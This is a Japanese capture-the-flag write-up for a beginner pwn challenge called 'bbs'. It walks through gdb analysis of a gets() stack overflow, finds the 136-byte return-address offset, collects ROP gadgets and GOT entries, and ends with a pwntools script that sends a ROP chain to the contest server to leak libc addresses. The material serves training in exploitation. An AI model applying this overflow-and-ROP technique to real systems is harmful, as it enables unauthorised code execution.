<!-- TITLE: Bbs -->
<!-- SUBTITLE: A quick summary of Bbs -->

# 問題概要
```
最近，BBSって言って掲示板だと伝わる人はどれくらいいるのでしょうね．

Host: pwn1.chall.beginners.seccon.jp
Port: 18373

https://score.beginners.seccon.jp/files/0c6414e595b3c4052c7e105e6164cb1f/bbs_3e897818670a0db55eaed8109b6a73f0e03d54e7
```

[bbs.tar.gz](/uploads/bin/bbs.tar.gz)


# 解析
## gdb

```console
gef> disas main
Dump of assembler code for function main:
   0x00000000004006a1 <+0>:	push   rbp
   0x00000000004006a2 <+1>:	mov    rbp,rsp
   0x00000000004006a5 <+4>:	add    rsp,0xffffffffffffff80
   0x00000000004006a9 <+8>:	mov    edi,0x400788
   0x00000000004006ae <+13>:	mov    eax,0x0
   0x00000000004006b3 <+18>:	call   0x400550 <printf@plt>
   0x00000000004006b8 <+23>:	lea    rax,[rbp-0x80]
   0x00000000004006bc <+27>:	mov    rdi,rax
   0x00000000004006bf <+30>:	mov    eax,0x0
   0x00000000004006c4 <+35>:	call   0x400570 <gets@plt>
   0x00000000004006c9 <+40>:	mov    edi,0x4007a0
   0x00000000004006ce <+45>:	call   0x400520 <puts@plt>
   0x00000000004006d3 <+50>:	mov    edi,0x4007c1
   0x00000000004006d8 <+55>:	call   0x400540 <system@plt>
   0x00000000004006dd <+60>:	lea    rax,[rbp-0x80]
   0x00000000004006e1 <+64>:	mov    rsi,rax
   0x00000000004006e4 <+67>:	mov    edi,0x4007c8
   0x00000000004006e9 <+72>:	mov    eax,0x0
   0x00000000004006ee <+77>:	call   0x400550 <printf@plt>
   0x00000000004006f3 <+82>:	mov    eax,0x0
   0x00000000004006f8 <+87>:	leave  
   0x00000000004006f9 <+88>:	ret    
End of assembler dump.
gef> checksec
[+] checksec for '/home/mkm/ctf/seccon_beginners/pwn_bbs/sandbox/bbs_3e897818670a0db55eaed8109b6a73f0e03d54e7'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

`0x00000000004006c4 <+35>`で`gets`を呼んでいてかつ*stack canary*もないので、*stack overflow*の脆弱性がある用に思えるので、試してみる

```console
gef> pattern create 256
[+] Generating a pattern of 256 bytes
aaaaaaaabaaaaaaa...(snip)...faaaaaabgaaaaaab
[+] Saved as '$_gef1'
gef> r <<< $(python -c 'print "aaaaaaaabaaaaaaa...(snip)...faaaaaabgaaaaaab"')
(snip)
─────────────────────────────────────────────────────────────────────────────────────────────[ threads ]────
[#0] Id 1, Name: "bbs_3e897818670", stopped, reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x4006f9 → Name: main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef> x/gx $rsp
0x7fffffffdff8:	0x6161616161616172
gef> pattern search 0x6161616161616172
[+] Searching '0x6161616161616172'
[+] Found at offset 136 (little-endian search) likely
[+] Found at offset 129 (big-endian search)
```

上の結果から、**136バイト**埋めるとその次に **$rsp** の値を任意の値に書き換えられる
ここからROPガジェットを使って任意の命令を実行していく

## ROPガジェットとGOT

```console
gef> ropper --search '% ?di'
(snip)
0x0000000000400763: pop rdi; ret;
gef> info functions
(snip)
0x0000000000400520  puts@plt
0x0000000000400530  setbuf@plt
0x0000000000400540  system@plt
0x0000000000400550  printf@plt
0x0000000000400560  __libc_start_main@plt
0x0000000000400570  gets@plt
(snip)
gef> disas 0x0000000000400540
Dump of assembler code for function system@plt:
   0x0000000000400540 <+0>:	jmp    QWORD PTR [rip+0x200ae2]        # 0x601028
   0x0000000000400546 <+6>:	push   0x2
   0x000000000040054b <+11>:	jmp    0x400510
End of assembler dump.

gef> disas 0x0000000000400520
Dump of assembler code for function puts@plt:
   0x0000000000400520 <+0>:	jmp    QWORD PTR [rip+0x200af2]        # 0x601018
   0x0000000000400526 <+6>:	push   0x0
   0x000000000040052b <+11>:	jmp    0x400510
End of assembler dump.

gef> disas 0x0000000000400570
Dump of assembler code for function gets@plt:
   0x0000000000400570 <+0>:	jmp    QWORD PTR [rip+0x200aca]        # 0x601040
   0x0000000000400576 <+6>:	push   0x5
   0x000000000040057b <+11>:	jmp    0x400510
End of assembler dump.
```

## libc version check
まずサーバの*libc*を調べる

```python
# -*- coding: utf-8 -*-
from pwn import *

popret = 0x0000000000400763
puts_plt = 0x0000000000400520
system_got = 0x601028
puts_got = 0x601018
gets_got = 0x601040

def upack(hexstr):
    return hex(u64(hexstr + ('\x00'*(8 - len(hexstr)))))

# popretでそれぞれのgotアドレスをレジスタに移して、puts@pltで呼び出し先のアドレスを出力
buf = ''
buf += 'A'*136
buf += p64(popret)
buf += p64(system_got)
buf += p64(puts_plt)
buf += p64(popret)
buf += p64(puts_got)
buf += p64(puts_plt)
buf += p64(popret)
buf += p64(gets_got)
buf += p64(puts_plt)

r = remote('pwn1.chall.beginners.seccon.jp', 18373)
r.recvuntil('Input Content : ')
r.sendline(buf)
a = r.recvall()
spl = a.split('\n')

hexaddrs = map(lambda x: upack(x), spl[-4:-1])
print 'system:', hexaddrs[0]
print 'puts  :', hexaddrs[1]
print 'gets  :', hexaddrs[2]
```

